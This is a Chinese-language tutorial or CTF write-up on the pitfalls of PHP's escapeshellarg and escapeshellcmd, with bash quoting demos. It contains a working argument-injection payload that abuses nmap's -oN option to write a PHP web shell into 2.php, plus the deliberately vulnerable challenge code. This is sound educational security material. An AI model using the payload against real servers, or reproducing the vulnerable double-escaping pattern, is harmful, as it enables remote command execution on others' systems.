### escapeshellarg

php手册上的解释为:

> escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)



错误的使用:

经过 escapeshellarg 函数处理过的参数被拼凑成 shell 命令 并且被双引号包裹这样就会造成漏洞

主要在于bash中双引号和单引号解析变量是有区别的

在解析单引号的时候 , 被单引号包裹的内容中如果有变量 , 这个变量名是不会被解析成值的
但是双引号不同 , bash 会将变量名解析成变量的值再使用

```bash
lj@lj:/usr/share/virtualbox$ echo `date`
2018年 01月 29日 星期一 11:38:08 CST
lj@lj:/usr/share/virtualbox$ echo '`date`'
`date`
lj@lj:/usr/share/virtualbox$ echo "`date`"
2018年 01月 29日 星期一 11:38:21 CST
lj@lj:/usr/share/virtualbox$ echo "'`date`'"
'2018年 01月 29日 星期一 11:38:27 CST'
lj@lj:/usr/share/virtualbox$ echo '"`date`"'
"`date`"
```


如上可知， 如果参数用了 escapeshellarg 函数过滤单引号，但参数在拼接命令的时候用了双引号的话还是会导致命令执行的漏洞。


具体漏洞参考: https://www.jianshu.com/p/162844f45f1d


### escapeshellcmd

php手册上的解释为:

escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。

反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\, \x0A 和 \xFF。 ` ' 和 " 仅在不配对儿的时候被转义`。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。


```php
<?php 

$s = "`ls`";
echo escapeshellcmd($s);

>>>
\`ls\`
```


### escapeshellarg() + escapeshellcmd() 之殇

这两个函数都会对单引号进行处理,但还是有区别的,区别如下:

```bash
echo escapeshellarg("l's")."\n";
echo escapeshellcmd("l's")."\n";
echo escapeshellarg("l''s")."\n";
echo escapeshellcmd("l''s")."\n";

>>>
'l'\''s'
l\'s
'l'\'''\''s'
l''s
```

对于单个单引号, escapeshellarg()函数转义后,还会在左右各加一个单引号,但escapeshellcmd()函数是直接加一个转义符

对于成对的单引号, escapeshellcmd()函数默认不转义,但escapeshellarg()函数转义:


我们来看看一个demo:

```php
<?php 
$param = "172.17.0.2' -v -d a=1";
$ep = escapeshellarg($param);
$eep = escapeshellcmd($ep);
$cmd = "curl ".$eep;
echo $ep."\n";
echo $eep."\n";
echo $cmd."\n";
system($cmd);

>>>
'172.17.0.2'\'' -v -d a=1'
'172.17.0.2'\\'' -v -d a=1\'
curl '172.17.0.2'\\'' -v -d a=1\'
* Rebuilt URL to: 172.17.0.2\/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 172.17.0.2...

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0
  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0* connect to 172.17.0.2 port 80 failed: 没有到主机的路由
* Failed to connect to 172.17.0.2\ port 80: 没有到主机的路由
* Closing connection 0
```

$host参数先用escapeshellarg()函数过滤后再用escapeshellcmd()过滤, 这样就会出问题了,

escapeshellarg 先转义了一个单引号,然后引入了一对单引号, escapeshellcmd 不会转义成对的单引号,但是会转义转移符`\`,这样, 转移符作用失效,逃逸出来一个单引号. 

> 顺序不能反了, 如果是先用escapeshellcmd函数过滤,再用的esc
apeshellarg函数过滤,则没有这个问题.

```
'172.17.0.2'\'' -v -d a=1'
'172.17.0.2'\\'' -v -d a=1\'
```

逃逸出来单引号有什么作用呢?  在curl命令中, 正常情况下我们输入的所有数据都会被当做host主机部分去访问, 但是如果我们逃逸出来了单引号, 我们就可以加入一些其他参数了.


我们来看一道题目:

```php
<?php 

// include("flag.php");
//echo escapeshellcmd("127.1'tar cvf lj ");
// exit();

if(!isset($_GET['host'])){
    highlight_file(__FILE__);
}else{
    $host =(string)$_GET['host'];
    $host=escapeshellarg($host);
    $host=escapeshellcmd($host);
    var_dump($host);
    $sandbox = md5("box".$_SERVER['REMOTE_ADDR']);
    echo "you are in sandbox: ".$sandbox."<br/>";
    @mkdir($sandbox);
    chdir($sandbox);
    echo "<pre>";
    echo system("nmap -T5  -sT -Pn --host-timeout 2 -F  ".$host);
    echo "</pre>";
}
?>
```

我们通过闭合单引号可以引入nmap的其他参数,虽然我们没法直接闭合命令,但nmap的一些参数就可以getshell了.


    ?host=%27%20<?=`id`;?> -oN 2.php-v 3
    
说明: nmap的-oN命令表示到处正常文件, 这里我们可以自定义文件名为2.php, 我们来看一下写入的文件内容

```php
# Nmap 7.01 scan initiated Tue Feb 27 14:21:40 2018 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oN 2.php -v \ <?=`id`;?> 3'
Failed to resolve "\".
Failed to resolve "<?=`id`;?>".
Failed to resolve "3'".
Read data files from: /usr/bin/../share/nmap
WARNING: No targets were specified, so 0 hosts scanned.
# Nmap done at Tue Feb 27 14:21:40 2018 -- 0 IP addresses (0 hosts up) scanned in 0.05 seconds
```

访问成功执行命令.

